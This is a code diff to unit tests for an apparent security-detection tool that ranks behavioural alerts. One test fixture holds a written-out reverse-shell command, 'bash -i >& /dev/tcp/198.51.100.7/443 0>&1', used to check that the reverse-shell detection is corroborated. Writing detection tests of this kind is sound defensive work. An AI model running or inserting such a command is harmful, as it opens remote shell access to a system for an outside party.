@@ -88,6 +88,8 @@ def _analytic(identifier, required_roles=None):
         "platforms": ["cross-platform"],
         "categories": ["execution"],
         "source": "elasticsearch",
+        "source_language": "elasticsearch_dsl",
+        "stage_id": f"{identifier}:elasticsearch",
         "required_roles": required_roles or ["process.command_line"],
         "optional_roles": [],
         "match": {
@@ -173,13 +175,20 @@ class CandidateRankingTests(unittest.TestCase):
     def test_independent_behavior_promotes_specific_lead(self):
         from romulus.intelligence.behavior_catalog import build_candidate_queue
 
-        event = _event(
-            "EV-CHAIN",
+        reverse_event = _event(
+            "EV-REVERSE",
             "srv-01",
-            process_executable="/tmp/.cache/x",
             process_command_line="bash -i >& /dev/tcp/198.51.100.7/443 0>&1",
         )
-        candidates = build_candidate_queue([event], self.catalog, {"indicators": []})
+        temp_event = _event(
+            "EV-TEMP",
+            "srv-01",
+            process_executable="/tmp/.cache/x",
+        )
+        reverse_event["raw"]["process"]["entity_id"] = "process-chain-1"
+        temp_event["raw"]["process"]["entity_id"] = "process-chain-1"
+        temp_event["observed_at"] = "2026-10-12T12:01:00Z"
+        candidates = build_candidate_queue([reverse_event, temp_event], self.catalog, {"indicators": []})
         reverse_shell = next(item for item in candidates if item["analytic_id"] == "BH-LNX-016")
         self.assertEqual(reverse_shell["disposition"], "corroborated")
         self.assertTrue(reverse_shell["customer_visible"])
@@ -361,7 +370,7 @@ class WorkflowIntegrationTests(unittest.TestCase):
             {"gte": "2026-10-01T00:00:00Z", "lte": "2026-10-02T00:00:00Z"},
             limit=60,
         )
-        ids = {item["analytic_id"] for item in queries}
+        ids = {analytic_id for item in queries for analytic_id in item["analytic_ids"]}
         self.assertIn("BH-XPLAT-001", ids)
         self.assertIn("BH-XPLAT-002", ids)
         self.assertTrue(any(item["id"] == "BH-LNX-006" for item in unsupported))
